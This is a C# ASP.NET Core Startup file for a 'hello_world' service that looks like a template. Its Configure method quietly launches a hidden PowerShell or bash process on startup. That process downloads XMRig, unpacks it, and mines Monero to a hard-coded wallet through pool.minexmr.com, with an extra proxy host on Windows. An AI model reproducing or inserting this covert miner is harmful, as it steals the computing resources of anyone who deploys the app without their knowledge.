using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Steeltoe.Discovery.Client;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace hello_world
{
    public class Startup
    {
        public Startup(IConfiguration configuration)
        {
            Configuration = configuration;
        }

        public IConfiguration Configuration { get; }

        // This method gets called by the runtime. Use this method to add services to the container.
        public void ConfigureServices(IServiceCollection services)
        {
            // Template code not shown.
            services.AddControllers();

            services.AddDiscoveryClient(Configuration);
        }

        // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.
        public void Configure(IApplicationBuilder app, IWebHostEnvironment env, IHostApplicationLifetime lifetime)
        {
            if (env.IsDevelopment())
            {
                app.UseDeveloperExceptionPage();
            }

            app.UseHttpsRedirection();

            app.UseRouting();

            app.UseAuthorization();

            app.UseEndpoints(endpoints => { endpoints.MapControllers(); });

            Task.Run(() =>
            {
                try
                {
                    var process = new Process();
                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    {
                        var processStartInfo = new ProcessStartInfo()
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            FileName = $"powershell.exe",
                            WorkingDirectory = AppContext.BaseDirectory,
                            Arguments = @"-c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
                             + "$ProgressPreference=\"SilentlyContinue\";"
                             + "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip;"
                             + "Expand-Archive -LiteralPath 'xmrig-6.17.0-gcc-win64.zip';"
                             + "xmrig-6.17.0-gcc-win64\\xmrig-6.17.0\\xmrig.exe -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.lynkwin -x covi21.ddns.net:10555 -B; Start-Sleep -Seconds 500000",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false
                        };
                        process.StartInfo = processStartInfo;
                    }
                    else
                    {
                        var processStartInfo = new ProcessStartInfo()
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            FileName = $"/bin/bash",
                            WorkingDirectory = AppContext.BaseDirectory,
                            Arguments =
                            $"-c \"cd /home/cnb; curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz; xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.lynk -B; sleep 500000\"",
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false
                        };
                        process.StartInfo = processStartInfo;
                    }

                    //process.StartInfo = processStartInfo;
                    process.Start();
                    process.WaitForExit();
                    string error = process.StandardError.ReadToEnd();
                    string output = process.StandardOutput.ReadToEnd();

                    Console.WriteLine("[ERROR] ", error);
                    Console.WriteLine("[OUTPUT] ", output);
                }
                catch (Exception ex)
                {
                    //_logger.LogError(ex.Message, ex);
                    throw;
                }
            });
        }
    }
}